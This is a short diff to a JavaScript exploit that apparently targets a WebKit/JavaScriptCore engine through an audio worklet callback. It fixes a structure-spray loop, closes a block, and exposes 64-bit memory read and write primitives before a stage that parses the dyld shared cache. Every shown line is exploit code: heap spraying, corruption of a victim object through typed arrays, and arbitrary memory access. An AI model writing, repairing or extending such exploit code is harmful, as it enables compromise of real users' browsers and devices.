@@ -687,7 +687,7 @@ b.process = (inputs, outputs, parameters)=>{
         var arr = [13.37];
         arr.a = 1337;
         arr['p'+i] = 13.37;                 // p+i instead of p in order to force new structure IDs
-        structure_spray_spray.push(arr)
+        structure_spray.push(arr)
     }
 
     // Pick a victim, any victim (seriously, any in the middle-ish)
@@ -757,6 +757,7 @@ b.process = (inputs, outputs, parameters)=>{
         u32[0] += 0x10; // Because accessing property does -0x10
         hax[1] = f64[0];
         victim.a = val;
+    }
     print("[+] limited memory read/write working");
         
         
@@ -785,6 +786,8 @@ b.process = (inputs, outputs, parameters)=>{
     }
     else if(stage =="parsecache") {
         print1(`success now about to parse dyld shared cache...`);
+        memory.read64 = read64;
+        memory.write64 = write64;
         memory.u32 = _u32;
         //gigauncager();
 
